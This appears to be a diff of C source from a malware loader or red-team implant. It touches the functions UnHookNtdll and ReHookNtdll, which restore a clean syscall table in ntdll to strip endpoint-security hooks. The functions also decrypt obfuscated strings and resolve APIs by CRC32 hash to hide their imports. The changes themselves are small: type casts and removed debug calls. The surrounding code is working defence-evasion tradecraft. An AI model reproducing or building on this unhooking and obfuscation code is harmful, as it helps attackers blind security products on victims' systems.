@@ -341,7 +341,6 @@ INT FindFirstSyscall(CHAR* pMem, DWORD size){
     for (i = 0; i < size - 3; i++) {
         if (!mem_cmp(pMem + i, pattern1, 3)) {
             offset = i;
-            check_debug(1==0,"FOUND! END");
             break;
         }
     }
@@ -350,7 +349,6 @@ INT FindFirstSyscall(CHAR* pMem, DWORD size){
     for (i = 3; i < 50 ; i++) {
         if (!mem_cmp(pMem + offset - i, pattern2, 3)) {
             offset = offset - i + 3;
-            check_debug(1==0,"FOUND! BEGINNING");
             break;
         }
     }
@@ -390,7 +388,7 @@ static INT UnHookNtdll(CONST HMODULE hNtdll, CONST VOID* pCacheClean){
 
     UCHAR s_xk[] = S_XK;
 
-    ROL_AND_DECRYPT((char *)s_string, sizeof(s_string), 1, d_string, s_xk);
+    ROL_AND_DECRYPT((CONST CHAR *)s_string, sizeof(s_string), 1, (CHAR*) d_string, (CONST CHAR *) s_xk);
 #else
 
     UCHAR d_string[13] = {'k','e','r','n','e','l','3','2','.','d','l','l',0x0};
@@ -419,7 +417,7 @@ static INT UnHookNtdll(CONST HMODULE hNtdll, CONST VOID* pCacheClean){
 #else
 
     VirtualProtect_t p_VirtualProtect =
-            (VirtualProtect_t) GetProcAddressByHash(LocalGetModuleHandle(d_string), VirtualProtect_CRC32B);
+            (VirtualProtect_t) GetProcAddressByHash(LocalGetModuleHandle((LPCSTR) d_string), VirtualProtect_CRC32B);
 #endif
 
     // find .text section
@@ -444,8 +442,8 @@ static INT UnHookNtdll(CONST HMODULE hNtdll, CONST VOID* pCacheClean){
 #endif
 
             // copy clean "syscall table" into ntdll memory
-            DWORD SC_start = FindFirstSyscall((UCHAR *) pCacheClean, pImgSectionHead->Misc.VirtualSize);
-            DWORD SC_end = FindLastSysCall((UCHAR *) pCacheClean, pImgSectionHead->Misc.VirtualSize);
+            DWORD SC_start = FindFirstSyscall((CHAR *) pCacheClean, pImgSectionHead->Misc.VirtualSize);
+            DWORD SC_end = FindLastSysCall((CHAR *) pCacheClean, pImgSectionHead->Misc.VirtualSize);
 
             if (SC_start != 0 && SC_end != 0 && SC_start < SC_end) {
                 DWORD SC_size = SC_end - SC_start;
@@ -494,7 +492,7 @@ static INT ReHookNtdll(CONST HMODULE hNtdll, CONST VOID* pCacheHooked){
 
     UCHAR s_xk[] = S_XK;
 
-    ROL_AND_DECRYPT((char *)s_string, sizeof(s_string), 1, d_string, s_xk);
+    ROL_AND_DECRYPT((CONST CHAR *)s_string, sizeof(s_string), 1, (CHAR*) d_string, (CONST CHAR *) s_xk);
 #else
 
     UCHAR d_string[13] = {'k','e','r','n','e','l','3','2','.','d','l','l',0x0};
@@ -523,7 +521,7 @@ static INT ReHookNtdll(CONST HMODULE hNtdll, CONST VOID* pCacheHooked){
 
 #else
     VirtualProtect_t p_VirtualProtect =
-            (VirtualProtect_t) GetProcAddressByHash(LocalGetModuleHandle(d_string), VirtualProtect_CRC32B);
+            (VirtualProtect_t) GetProcAddressByHash(LocalGetModuleHandle((LPCSTR) d_string), VirtualProtect_CRC32B);
 #endif
 
     // find .text section
